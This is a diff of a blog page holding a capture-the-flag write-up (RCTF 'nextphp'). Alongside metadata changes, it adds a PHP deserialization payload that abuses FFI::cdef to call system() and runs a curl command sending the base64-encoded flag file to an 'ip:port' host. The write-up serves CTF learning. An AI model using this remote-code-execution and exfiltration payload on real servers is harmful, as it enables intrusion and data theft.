@@ -91,7 +91,7 @@
 <meta property="og:image" content="http://yoursite.com/images/1558661277840.png">
 <meta property="og:image" content="http://yoursite.com/images/1558662169382.png">
 <meta property="og:image" content="http://yoursite.com/images/1558664449535.png">
-<meta property="og:updated_time" content="2019-07-07T04:40:44.802Z">
+<meta property="og:updated_time" content="2019-08-09T01:45:24.782Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RCTF-nextphp">
 <meta name="twitter:description" content="nextphp首先看一下phpinfo，php7.4 发现过滤了很多函数  搜一下php7.4的新特性，发现有个新功能预加载，而且在phpinfo里也发现了  读一下preload.php 的源码，/?a=show_source(%27preload.php%27); 12345678910111213141516171819202122232425262728293031323334353637">
@@ -319,7 +319,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  454
+                  513
                 </span>
               
 
@@ -361,6 +361,7 @@
 <p>payload如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &apos;ret&apos; =&gt; null,</span><br><span class="line">        &apos;func&apos; =&gt; &apos;FFI::cdef&apos;,</span><br><span class="line">        &apos;arg&apos; =&gt; &quot;int php_exec(int type, char *cmd);&quot;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
 
+<p>payload<code>?a=$a=unserialize(&#39;C:1:&quot;A&quot;:96:{a:3:{s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;}}&#39;);var_dump($a-&gt;ret-&gt;system(&#39;curl ip:port/</code>cat /flag | base64<code>&#39;));</code></p>
 <p><img src="/images/1558664449535.png" alt="1558664449535"></p>
 
       
@@ -483,7 +484,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-count">18</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -496,7 +497,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
